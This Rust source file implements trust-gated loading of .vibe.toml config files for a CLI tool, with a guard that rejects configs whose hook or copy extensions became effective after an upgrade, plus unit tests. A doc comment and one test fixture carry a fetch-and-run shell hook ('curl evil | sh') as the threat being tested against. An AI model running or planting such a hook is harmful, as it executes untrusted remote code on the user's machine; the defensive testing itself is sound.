//! Trust-gated loading of `.vibe.toml` / `.vibe.local.toml`.
//!
//! Ported from `loadVibeConfig` in `packages/core/src/utils/config.ts`. The pure
//! parse/merge logic lives in [`crate::config`]; this module wires it to the
//! trust store: each file is read THROUGH [`verify_trust_and_read`], and the
//! exact bytes that the trust decision was made on are parsed — never re-opened
//! — to close the TOCTOU window.
//!
//! Divergence from the TS (intentional): the TS printed an error and called
//! `exit(1)` for an untrusted file (a side effect buried in a loader). Here an
//! untrusted file is surfaced as an [`VibeError::Configuration`] so the binary
//! owns the exit, keeping vibe-core free of process-exit side effects. The
//! message text mirrors the TS (`<file> is not trusted or has been modified.\n
//! Please run: vibe trust`), prefixed with the offending file path.
//!
//! Second divergence (issue #599): the TS reached `mergeConfigs` only when BOTH
//! files existed, so with a lone `.vibe.toml` every `*_prepend`/`*_append` field
//! was parsed and then silently ignored. Every arm now runs the file through
//! [`crate::config::normalize_config`] (via `RawConfig::normalize`), making the
//! within-file extension fields effective regardless of how many config files a
//! repo has.
//!
//! SECURITY: that divergence promotes dormant config to executable config. A
//! `.vibe.toml` trusted under the old rules could carry, say,
//! `hooks.post_start_append = ["curl … | sh"]` that never ran; upgrading the
//! binary would run it on the next `vibe start`, and the SHA-256 trust hash
//! cannot notice because the bytes did not change. [`load_vibe_config`]
//! therefore fails closed when a config actually USES one of the newly-effective
//! positions while its trust entry predates `config::CONFIG_SEMANTICS_REV`,
//! demanding an explicit `vibe trust`.
//! Configs that do not use those positions are unaffected: nobody is forced to
//! re-trust for a change that cannot alter their config's meaning.

use crate::config::{
    extension_fields_beside_own_field, extension_fields_in_use, merge_configs, parse_vibe_config,
    RawConfig, VibeConfig, CONFIG_SEMANTICS_REV,
};
use crate::error::{Result, VibeError};
use crate::io::Io;
use crate::settings::RepoResolver;
use crate::settings_io::verify_trust_and_read;
use std::path::Path;

/// The repository-level config file name. Single source of truth: the trust
/// commands and any future config-aware command reference these rather than
/// redefining the literals (the TS had each command file declare its own).
pub const VIBE_TOML: &str = ".vibe.toml";
/// The machine-local override config file name.
pub const VIBE_LOCAL_TOML: &str = ".vibe.local.toml";

/// Load and merge the trusted config under `repo_root`.
///
/// For `.vibe.toml` then `.vibe.local.toml`: if the file exists, verify trust
/// and parse the verified content. Each file's own `*_prepend`/`*_append`
/// fields are then resolved within that file (`prepend ++ field ++ append`),
/// and the local file merges OVER the base's effective config. Returns the
/// merged config, or `None` when neither file exists. An existing-but-untrusted
/// (or modified) file is an error — per file, naming that file. A file that
/// relies on a position which only became effective in
/// `CONFIG_SEMANTICS_REV` while its trust predates that revision is likewise an
/// error demanding a re-run of `vibe trust`.
pub fn load_vibe_config(
    io: &impl Io,
    resolver: &impl RepoResolver,
    version: &str,
    repo_root: &str,
) -> Result<Option<VibeConfig>> {
    let base = load_one(io, resolver, version, repo_root, VIBE_TOML)?;
    let local = load_one(io, resolver, version, repo_root, VIBE_LOCAL_TOML)?;

    // Fail closed BEFORE normalization: once the arrays are folded the newly-
    // effective positions are indistinguishable from always-effective ones.
    check_semantics_rev(base.as_ref(), local.as_ref())?;

    // Why not normalize `local` too before merging: an extension-only local
    // (e.g. only `files_append`) must reach merge_array_field with its field
    // slot still None so it WRAPS the base's effective array. Pre-folding it
    // would turn it into an override and replace the base — the documented
    // cross-file merge table depends on that distinction.
    let merged = match (base, local) {
        (Some(base), Some(local)) => Some(merge_configs(
            &base.config.normalize(),
            local.config.as_config(),
        )),
        (Some(single), None) | (None, Some(single)) => Some(single.config.normalize()),
        (None, None) => None,
    };
    Ok(merged)
}

/// A trusted, parsed config file plus the trust metadata needed to decide
/// whether the newly-effective extension positions may be honored.
struct LoadedFile {
    file_name: &'static str,
    path: String,
    config: RawConfig,
    /// The [`CONFIG_SEMANTICS_REV`] the trust entry was granted under.
    semantics_rev: u32,
}

/// Which file of a load a config plays, since the set of newly-effective
/// positions differs between them (see [`newly_effective_fields`]).
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) enum ConfigRole {
    /// Only one of the two config files exists in the repo.
    Single,
    /// `.vibe.toml` with a `.vibe.local.toml` beside it.
    BaseOfPair,
    /// `.vibe.local.toml` with a `.vibe.toml` beside it.
    LocalOfPair,
}

/// Dotted names of the positions in `config` that were parsed-but-inert before
/// issue #599 and now take effect, given the file's `role` in the load.
///
/// The single source of truth for "did this file's meaning change?": the
/// fail-closed loader guard ([`check_semantics_rev`]) and the advisory
/// `vibe verify` status line both call it, so a diagnostic can never disagree
/// with the error it is meant to explain. Taking [`RawConfig`] is what keeps a
/// normalized config — whose folded slots would read as "nothing newly
/// effective" — out of the guard.
///
/// The inert positions were:
///
/// - any `*_prepend`/`*_append` in a single-file load (only `.vibe.toml` or only
///   `.vibe.local.toml`) — the TS never reached `mergeConfigs` at all;
/// - any `*_prepend`/`*_append` in the BASE file of a two-file load — only the
///   local file's extensions were consulted;
/// - a `*_prepend`/`*_append` set beside its own base field in either file — the
///   TS returned the override outright and dropped the extension.
///
/// A file using none of these is unaffected by the change.
pub(crate) fn newly_effective_fields(config: &RawConfig, role: ConfigRole) -> Vec<String> {
    match role {
        ConfigRole::Single | ConfigRole::BaseOfPair => extension_fields_in_use(config),
        ConfigRole::LocalOfPair => extension_fields_beside_own_field(config),
    }
}

/// Reject a config whose meaning changed since it was trusted.
///
/// Loads regardless of the entry's revision when the file uses none of the
/// newly-effective positions: nobody is forced to re-trust for a change that
/// cannot alter their config's meaning.
fn check_semantics_rev(base: Option<&LoadedFile>, local: Option<&LoadedFile>) -> Result<()> {
    let single_file = base.is_none() || local.is_none();

    for (file, is_base) in [(base, true), (local, false)] {
        let Some(file) = file else { continue };
        if file.semantics_rev >= CONFIG_SEMANTICS_REV {
            continue;
        }
        let role = match (single_file, is_base) {
            (true, _) => ConfigRole::Single,
            (false, true) => ConfigRole::BaseOfPair,
            (false, false) => ConfigRole::LocalOfPair,
        };
        let newly_effective = newly_effective_fields(&file.config, role);
        if !newly_effective.is_empty() {
            return Err(semantics_changed_error(file, &newly_effective));
        }
    }
    Ok(())
}

/// The fail-closed message: what changed, which fields are affected, and the
/// single action that resolves it.
fn semantics_changed_error(file: &LoadedFile, fields: &[String]) -> VibeError {
    let path = &file.path;
    let name = file.file_name;
    let list = fields.join(", ");
    VibeError::Configuration(format!(
        "{path}: {name} was trusted under older configuration semantics.\n\
         These fields were accepted but ignored back then and now take effect: {list}\n\
         Review the file, then re-approve it with: vibe trust"
    ))
}

/// Load a single config file by name under `repo_root`, gated by trust.
///
/// - file absent → `Ok(None)`
/// - present + trusted → `Ok(Some(parsed))` using the VERIFIED content (no
///   re-read; TOCTOU-safe)
/// - present + untrusted/modified → `Err(Configuration)` naming the file
fn load_one(
    io: &impl Io,
    resolver: &impl RepoResolver,
    version: &str,
    repo_root: &str,
    file_name: &'static str,
) -> Result<Option<LoadedFile>> {
    let path = Path::new(repo_root).join(file_name);
    let path_str = path.to_string_lossy();

    let exists = path.exists();
    if !exists {
        return Ok(None);
    }

    let verdict = verify_trust_and_read(io, resolver, version, &path_str)?;
    if !verdict.trusted {
        return Err(VibeError::Configuration(format!(
            "{path_str}: {file_name} file is not trusted or has been modified.\nPlease run: vibe trust"
        )));
    }

    // `trusted` implies `content` is Some; parse THOSE bytes, never re-open.
    let content = verdict.content.unwrap_or_default();
    let config = parse_vibe_config(&content, &path_str)?;
    Ok(Some(LoadedFile {
        file_name,
        path: path_str.into_owned(),
        config,
        semantics_rev: verdict.semantics_rev.unwrap_or(0),
    }))
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::git::RepoInfo;
    use crate::hash::hash_content;
    use crate::io::FakeIo;
    use crate::settings::{AllowEntry, RepoId, VibeSettings};
    use crate::settings_io::save_user_settings;
    use std::collections::HashMap;
    use std::path::Path;
    use vibe_test_support::Fixture;

    const V: &str = "1.8.1+abc";

    /// Resolver mapping a fixed set of paths to repo info; hash via real files.
    #[derive(Default)]
    struct MapResolver {
        repos: HashMap<String, RepoInfo>,
    }
    impl RepoResolver for MapResolver {
        fn repo_info(&self, path: &str) -> Option<RepoInfo> {
            self.repos.get(path).cloned()
        }
        fn hash_file(&self, path: &str) -> std::result::Result<String, String> {
            crate::hash::hash_file(path).map_err(|e| e.to_string())
        }
    }

    fn io_for(home: &Path) -> FakeIo {
        FakeIo::new().with_env("HOME", home.to_str().unwrap())
    }

    /// Register `repo_root/<file>` as trusted (its current content hash) under
    /// the current semantics revision, returning a resolver knowing its repo.
    fn trust_file(io: &FakeIo, repo_root: &Path, file: &str, content: &str) -> MapResolver {
        trust_files_at_rev(
            io,
            repo_root,
            &[(file, content)],
            Some(CONFIG_SEMANTICS_REV),
        )
    }

    /// As [`trust_file`], but for a grant recorded under `rev` (`None` = a
    /// pre-#599 entry, i.e. revision 0).
    fn trust_file_at_rev(
        io: &FakeIo,
        repo_root: &Path,
        file: &str,
        content: &str,
        rev: Option<u32>,
    ) -> MapResolver {
        trust_files_at_rev(io, repo_root, &[(file, content)], rev)
    }

    /// Register BOTH config files as trusted and return a resolver knowing them.
    fn trust_both(io: &FakeIo, repo_root: &Path, base: &str, local: &str) -> MapResolver {
        trust_both_at_rev(io, repo_root, base, local, Some(CONFIG_SEMANTICS_REV))
    }

    /// As [`trust_both`], with both grants recorded under `rev`.
    fn trust_both_at_rev(
        io: &FakeIo,
        repo_root: &Path,
        base: &str,
        local: &str,
        rev: Option<u32>,
    ) -> MapResolver {
        trust_files_at_rev(
            io,
            repo_root,
            &[(VIBE_TOML, base), (VIBE_LOCAL_TOML, local)],
            rev,
        )
    }

    /// Write a settings doc trusting each `(file, content)` pair under `rev`.
    fn trust_files_at_rev(
        io: &FakeIo,
        repo_root: &Path,
        files: &[(&str, &str)],
        rev: Option<u32>,
    ) -> MapResolver {
        let mut settings = VibeSettings::default_settings();
        let mut repos = HashMap::new();
        for (file, content) in files {
            settings.permissions.allow.push(AllowEntry {
                repo_id: RepoId {
                    remote_url: None,
                    repo_root: Some(repo_root.to_string_lossy().into_owned()),
                },
                relative_path: (*file).into(),
                hashes: vec![hash_content(content.as_bytes())],
                skip_hash_check: None,
                config_semantics_rev: rev,
            });
            repos.insert(
                repo_root.join(file).to_string_lossy().into_owned(),
                RepoInfo {
                    remote_url: None,
                    repo_root: repo_root.to_string_lossy().into_owned(),
                    relative_path: (*file).into(),
                },
            );
        }
        save_user_settings(io, &settings, V).unwrap();
        MapResolver { repos }
    }

    #[test]
    fn neither_file_returns_none() {
        let fx = Fixture::new();
        let repo = fx.mkdir("repo");
        let io = io_for(fx.path());
        let resolver = MapResolver::default();
        let cfg = load_vibe_config(&io, &resolver, V, repo.to_str().unwrap()).unwrap();
        assert_eq!(cfg, None);
    }

    #[test]
    fn trusted_base_is_parsed() {
        let fx = Fixture::new();
        let repo = fx.mkdir("repo");
        let content = "[copy]\nfiles = [\".env\"]\n";
        let _ = fx.write("repo/.vibe.toml", content);
        let io = io_for(fx.path());
        let resolver = trust_file(&io, &repo, ".vibe.toml", content);

        let cfg = load_vibe_config(&io, &resolver, V, repo.to_str().unwrap())
            .unwrap()
            .unwrap();
        assert_eq!(cfg.copy.unwrap().files, Some(vec![".env".to_string()]));
    }

    #[test]
    fn single_base_file_append_is_applied() {
        // Issue #599: with only .vibe.toml, files_append must still take effect.
        let fx = Fixture::new();
        let repo = fx.mkdir("repo");
        let content = "[copy]\nfiles = [\".env\"]\nfiles_append = [\".env.local\"]\n";
        let _ = fx.write("repo/.vibe.toml", content);
        let io = io_for(fx.path());
        let resolver = trust_file(&io, &repo, ".vibe.toml", content);

        let cfg = load_vibe_config(&io, &resolver, V, repo.to_str().unwrap())
            .unwrap()
            .unwrap();
        assert_eq!(
            cfg.copy.unwrap().files,
            Some(vec![".env".to_string(), ".env.local".to_string()])
        );
    }

    #[test]
    fn single_base_file_hook_append_without_base_is_applied() {
        let fx = Fixture::new();
        let repo = fx.mkdir("repo");
        let content = "[hooks]\npost_start_append = [\"echo hi\"]\n";
        let _ = fx.write("repo/.vibe.toml", content);
        let io = io_for(fx.path());
        let resolver = trust_file(&io, &repo, ".vibe.toml", content);

        let cfg = load_vibe_config(&io, &resolver, V, repo.to_str().unwrap())
            .unwrap()
            .unwrap();
        assert_eq!(
            cfg.hooks.unwrap().post_start,
            Some(vec!["echo hi".to_string()])
        );
    }

    #[test]
    fn local_only_append_is_applied() {
        let fx = Fixture::new();
        let repo = fx.mkdir("repo");
        let content = "[copy]\nfiles_append = [\".env.local\"]\n";
        let _ = fx.write("repo/.vibe.local.toml", content);
        let io = io_for(fx.path());
        let resolver = trust_file(&io, &repo, ".vibe.local.toml", content);

        let cfg = load_vibe_config(&io, &resolver, V, repo.to_str().unwrap())
            .unwrap()
            .unwrap();
        assert_eq!(
            cfg.copy.unwrap().files,
            Some(vec![".env.local".to_string()])
        );
    }

    #[test]
    fn base_append_survives_when_local_exists() {
        let fx = Fixture::new();
        let repo = fx.mkdir("repo");
        let base = "[copy]\nfiles = [\".env\"]\nfiles_append = [\".base-app\"]\n";
        let local = "[clean]\ndelete_branch = true\n";
        let _ = fx.write("repo/.vibe.toml", base);
        let _ = fx.write("repo/.vibe.local.toml", local);
        let io = io_for(fx.path());
        let resolver = trust_both(&io, &repo, base, local);

        let cfg = load_vibe_config(&io, &resolver, V, repo.to_str().unwrap())
            .unwrap()
            .unwrap();
        assert_eq!(
            cfg.copy.unwrap().files,
            Some(vec![".env".to_string(), ".base-app".to_string()])
        );
    }

    #[test]
    fn trusted_base_and_local_are_merged() {
        let fx = Fixture::new();
        let repo = fx.mkdir("repo");
        let base = "[copy]\nfiles = [\".env\"]\n";
        let local = "[copy]\nfiles_append = [\".env.local\"]\n";
        let _ = fx.write("repo/.vibe.toml", base);
        let _ = fx.write("repo/.vibe.local.toml", local);
        let io = io_for(fx.path());

        // Trust BOTH files (one settings doc, two allow entries).
        let resolver = trust_both(&io, &repo, base, local);

        let cfg = load_vibe_config(&io, &resolver, V, repo.to_str().unwrap())
            .unwrap()
            .unwrap();
        // local files_append wraps the base files.
        assert_eq!(
            cfg.copy.unwrap().files,
            Some(vec![".env".to_string(), ".env.local".to_string()])
        );
    }

    #[test]
    fn untrusted_file_errors_with_filename() {
        let fx = Fixture::new();
        let repo = fx.mkdir("repo");
        // File exists but is NOT in the allow list → untrusted.
        let _ = fx.write("repo/.vibe.local.toml", "[copy]\nfiles = []\n");
        let io = io_for(fx.path());
        // Resolver knows the repo (so it is "in a repo") but no settings entry.
        let mut repos = HashMap::new();
        repos.insert(
            repo.join(".vibe.local.toml").to_string_lossy().into_owned(),
            RepoInfo {
                remote_url: None,
                repo_root: repo.to_string_lossy().into_owned(),
                relative_path: ".vibe.local.toml".into(),
            },
        );
        let resolver = MapResolver { repos };

        let err = load_vibe_config(&io, &resolver, V, repo.to_str().unwrap()).unwrap_err();
        let msg = err.to_string();
        assert!(
            msg.contains(".vibe.local.toml file is not trusted or has been modified"),
            "msg: {msg}"
        );
        assert!(msg.contains("Please run: vibe trust"), "msg: {msg}");
        // The offending file is named correctly (local, not base).
        assert!(msg.contains(".vibe.local.toml"), "msg: {msg}");
    }

    // --- semantics-revision guard (issue #599 activation) -------------------

    /// Assert the error is the "semantics changed, re-trust" one, naming `file`
    /// and every field in `fields`.
    fn assert_semantics_error(err: &VibeError, file: &str, fields: &[&str]) {
        let msg = err.to_string();
        assert!(
            msg.contains("was trusted under older configuration semantics"),
            "expected the semantics-change error, got: {msg}"
        );
        assert!(msg.contains(file), "error must name {file}: {msg}");
        for field in fields {
            assert!(msg.contains(field), "error must name {field}: {msg}");
        }
        assert!(
            msg.contains("vibe trust"),
            "error must point at `vibe trust`: {msg}"
        );
    }

    #[test]
    fn old_rev_entry_without_extension_fields_loads_normally() {
        // Nobody is forced to re-trust for a change that cannot alter their
        // config's meaning: no *_prepend/*_append, so revision 0 is fine.
        let fx = Fixture::new();
        let repo = fx.mkdir("repo");
        let content = "[copy]\nfiles = [\".env\"]\n[hooks]\npost_start = [\"echo hi\"]\n";
        let _ = fx.write("repo/.vibe.toml", content);
        let io = io_for(fx.path());
        let resolver = trust_file_at_rev(&io, &repo, ".vibe.toml", content, None);

        let cfg = load_vibe_config(&io, &resolver, V, repo.to_str().unwrap())
            .unwrap()
            .unwrap();
        assert_eq!(cfg.copy.unwrap().files, Some(vec![".env".to_string()]));
    }

    #[test]
    fn old_rev_single_base_file_with_append_is_rejected() {
        // Case (a): a lone .vibe.toml whose hooks append was inert before #599
        // must not start executing just because the binary was upgraded.
        let fx = Fixture::new();
        let repo = fx.mkdir("repo");
        let content = "[hooks]\npost_start_append = [\"curl evil | sh\"]\n";
        let _ = fx.write("repo/.vibe.toml", content);
        let io = io_for(fx.path());
        let resolver = trust_file_at_rev(&io, &repo, ".vibe.toml", content, None);

        let err = load_vibe_config(&io, &resolver, V, repo.to_str().unwrap()).unwrap_err();
        assert_semantics_error(&err, ".vibe.toml", &["hooks.post_start_append"]);
    }

    #[test]
    fn old_rev_single_local_file_with_append_is_rejected() {
        // Case (a) for the other single-file arm: a lone .vibe.local.toml.
        let fx = Fixture::new();
        let repo = fx.mkdir("repo");
        let content = "[copy]\nfiles_append = [\".env.local\"]\n";
        let _ = fx.write("repo/.vibe.local.toml", content);
        let io = io_for(fx.path());
        let resolver = trust_file_at_rev(&io, &repo, ".vibe.local.toml", content, None);

        let err = load_vibe_config(&io, &resolver, V, repo.to_str().unwrap()).unwrap_err();
        assert_semantics_error(&err, ".vibe.local.toml", &["copy.files_append"]);
    }

    #[test]
    fn old_rev_base_extension_with_local_present_is_rejected() {
        // Case (b): with both files present, only the LOCAL file's extensions
        // used to be consulted, so the base's append is newly effective.
        let fx = Fixture::new();
        let repo = fx.mkdir("repo");
        let base = "[copy]\ndirs_prepend = [\"node_modules\"]\n";
        let local = "[clean]\ndelete_branch = true\n";
        let _ = fx.write("repo/.vibe.toml", base);
        let _ = fx.write("repo/.vibe.local.toml", local);
        let io = io_for(fx.path());
        let resolver = trust_both_at_rev(&io, &repo, base, local, None);

        let err = load_vibe_config(&io, &resolver, V, repo.to_str().unwrap()).unwrap_err();
        assert_semantics_error(&err, ".vibe.toml", &["copy.dirs_prepend"]);
    }

    #[test]
    fn old_rev_local_field_beside_own_extension_is_rejected() {
        // Case (c): the TS returned the override outright, dropping an extension
        // given beside it — even in the local file of a two-file load.
        let fx = Fixture::new();
        let repo = fx.mkdir("repo");
        let base = "[copy]\nfiles = [\".env\"]\n";
        let local = "[copy]\nfiles = [\".env.local\"]\nfiles_append = [\".env.extra\"]\n";
        let _ = fx.write("repo/.vibe.toml", base);
        let _ = fx.write("repo/.vibe.local.toml", local);
        let io = io_for(fx.path());
        let resolver = trust_both_at_rev(&io, &repo, base, local, None);

        let err = load_vibe_config(&io, &resolver, V, repo.to_str().unwrap()).unwrap_err();
        assert_semantics_error(&err, ".vibe.local.toml", &["copy.files_append"]);
    }

    #[test]
    fn old_rev_local_extension_only_still_loads_with_base_present() {
        // The one extension position that ALWAYS worked: a local-only append
        // wrapping the base array. It predates #599, so it must not demand a
        // re-trust.
        let fx = Fixture::new();
        let repo = fx.mkdir("repo");
        let base = "[copy]\nfiles = [\".env\"]\n";
        let local = "[copy]\nfiles_append = [\".env.local\"]\n";
        let _ = fx.write("repo/.vibe.toml", base);
        let _ = fx.write("repo/.vibe.local.toml", local);
        let io = io_for(fx.path());
        let resolver = trust_both_at_rev(&io, &repo, base, local, None);

        let cfg = load_vibe_config(&io, &resolver, V, repo.to_str().unwrap())
            .unwrap()
            .unwrap();
        assert_eq!(
            cfg.copy.unwrap().files,
            Some(vec![".env".to_string(), ".env.local".to_string()])
        );
    }

    #[test]
    fn current_rev_entry_makes_extension_fields_effective() {
        // After `vibe trust` re-stamps the entry, the same config loads and the
        // newly-effective arrays are honored.
        let fx = Fixture::new();
        let repo = fx.mkdir("repo");
        let content = "[hooks]\npost_start = [\"a\"]\npost_start_append = [\"b\"]\n";
        let _ = fx.write("repo/.vibe.toml", content);
        let io = io_for(fx.path());
        let resolver = trust_file_at_rev(
            &io,
            &repo,
            ".vibe.toml",
            content,
            Some(CONFIG_SEMANTICS_REV),
        );

        let cfg = load_vibe_config(&io, &resolver, V, repo.to_str().unwrap())
            .unwrap()
            .unwrap();
        assert_eq!(
            cfg.hooks.unwrap().post_start,
            Some(vec!["a".to_string(), "b".to_string()])
        );
    }

    #[test]
    fn untrusted_file_with_extension_fields_still_reports_untrusted() {
        // The trust gate runs first: an untrusted file must not be re-labelled
        // as a semantics problem (which would suggest `vibe trust` fixes a
        // tampered file's hash mismatch for the wrong reason).
        let fx = Fixture::new();
        let repo = fx.mkdir("repo");
        let _ = fx.write("repo/.vibe.toml", "[copy]\nfiles_append = [\"x\"]\n");
        let io = io_for(fx.path());
        // Trusted hash is for DIFFERENT content → hash mismatch.
        let resolver = trust_file_at_rev(&io, &repo, ".vibe.toml", "other = true\n", None);

        let err = load_vibe_config(&io, &resolver, V, repo.to_str().unwrap()).unwrap_err();
        let msg = err.to_string();
        assert!(
            msg.contains("is not trusted or has been modified"),
            "msg: {msg}"
        );
        assert!(
            !msg.contains("older configuration semantics"),
            "untrusted must win over the semantics guard: {msg}"
        );
    }
}
